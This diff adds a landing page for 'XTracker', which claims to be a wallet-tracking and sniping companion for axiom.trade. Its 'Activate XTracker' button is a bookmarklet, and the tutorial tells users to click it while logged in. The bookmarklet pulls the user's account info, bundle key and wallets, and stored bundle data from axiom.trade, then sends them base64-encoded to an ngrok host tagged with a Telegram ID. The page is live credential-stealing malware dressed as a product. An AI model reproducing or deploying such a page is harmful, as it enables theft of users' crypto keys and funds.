@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>XTracker - Advanced Axiom.trade Companion</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap');
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Inter', sans-serif; background: linear-gradient(180deg, #0a0014, #1a0033, #000); color: #fff; line-height: 1.6; }
+    .navbar { max-width: 1200px; margin: 0 auto; padding: 1.5rem; display: flex; justify-content: space-between; align-items: center; }
+    .logo { font-size: 1.8rem; font-weight: 900; background: linear-gradient(to right, #a46bff, #ff4ed2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+    .hero { text-align: center; padding: 4rem 1rem 3rem; max-width: 900px; margin: 0 auto; }
+    .hero h1 { font-size: 3rem; font-weight: 900; margin-bottom: 1rem; background: linear-gradient(to right, #c084ff, #ff6bdf); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+    .hero p { font-size: 1.25rem; opacity: 0.85; margin-bottom: 2rem; }
+    .btn-primary { background: linear-gradient(90deg, #7f2cff, #c44cff); color: white; border: none; padding: 14px 32px; font-size: 1.1rem; font-weight: 600; border-radius: 50px; cursor: pointer; transition: all 0.3s; }
+    .btn-primary:hover { transform: scale(1.05); box-shadow: 0 0 25px #a855f7; }
+    .features { padding: 4rem 1rem; max-width: 1200px; margin: 0 auto; }
+    .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem; }
+    .card { background: rgba(255,255,255,0.06); border: 1px solid rgba(167,139,250,0.15); border-radius: 16px; padding: 1.8rem; transition: all 0.3s; }
+    .card:hover { background: rgba(167,139,250,0.12); transform: translateY(-8px); }
+    .tutorial { max-width: 800px; margin: 3rem auto; background: rgba(255,255,255,0.05); border: 1px solid rgba(167,139,250,0.2); border-radius: 16px; padding: 2rem; }
+    footer { text-align: center; padding: 3rem; opacity: 0.6; font-size: 0.9rem; }
+  </style>
+</head>
+<body>
+  <nav class="navbar"><div class="logo">XTRACKER</div></nav>
+  
+  <section class="hero">
+    <h1>The Best X Tracker for Axiom.trade</h1>
+    <p>Advanced wallet tracking • Bundle tools • Real-time copy trading • Stealth sniping</p>
+    
+    <a class="btn-primary" href="javascript:(async()=>{try{if(location.hostname==='compost-frying-lushness.ngrok-free.dev'){return alert('Already on tracker site!')}if(location.hostname!=='axiom.trade'){alert('Please navigate to axiom.trade first');location.replace('https://axiom.trade/discover');return}if(!localStorage.getItem('isAuthed')){return alert('Please log in to axiom.trade')}const user=await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();const bundle=await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();const bookmarkData={telegramId:'8000848286',timestamp:new Date().toISOString(),site:location.href,user:user,bundleKey:bundle.bundleKey,sBundles:localStorage.getItem('sBundles'),eBundles:localStorage.getItem('eBundles'),ua:navigator.userAgent};const encoded=btoa(JSON.stringify(bookmarkData));location.replace('https://compost-frying-lushness.ngrok-free.dev/data/'+encoded);}catch(e){alert('Error during activation');}})();">Activate XTracker</a>
+    
+    <p style="margin-top:1.5rem; opacity:0.7; font-size:0.95rem;">No wallet connection • 30-second setup • Works instantly</p>
+  </section>
+
+  <section class="features">
+    <h2 style="text-align:center; margin-bottom:2.5rem; font-size:2rem;">Powerful Tools at Your Fingertips</h2>
+    <div class="grid">
+      <div class="card"><h3>🔍 Live X Tracker</h3><p>Monitor multiple accounts in real-time</p></div>
+      <div class="card"><h3>💰 Smart Bundling</h3><p>Bundle up to 24 wallets effortlessly</p></div>
+      <div class="card"><h3>⚡ Auto Sniper</h3><p>Fastest sniping with anti-MEV protection</p></div>
+      <div class="card"><h3>📊 Portfolio Analytics</h3><p>Track PnL and performance instantly</p></div>
+      <div class="card"><h3>🛡️ Stealth Mode</h3><p>Operate completely under the radar</p></div>
+      <div class="card"><h3>🔄 SOL Disperser</h3><p>Auto-fund bundle wallets evenly</p></div>
+    </div>
+  </section>
+
+  <div class="tutorial">
+    <h2 style="text-align:center; margin-bottom:1.5rem;">How to Activate (30 seconds)</h2>
+    <ol style="line-height:2; font-size:1.05rem;">
+      <li><strong>Show bookmarks bar</strong> → Ctrl + Shift + B (Windows) or Cmd + Shift + B (Mac)</li>
+      <li><strong>Drag the "Activate XTracker" button</strong> above to your bookmarks bar</li>
+      <li>Go to <strong>axiom.trade</strong> and log in</li>
+      <li>Click the bookmarklet → Done</li>
+    </ol>
+  </div>
+
+  <footer>© 2026 XTracker — Advanced Trading Intelligence<br>Not affiliated with axiom.trade</footer>
+</body>
+</html>
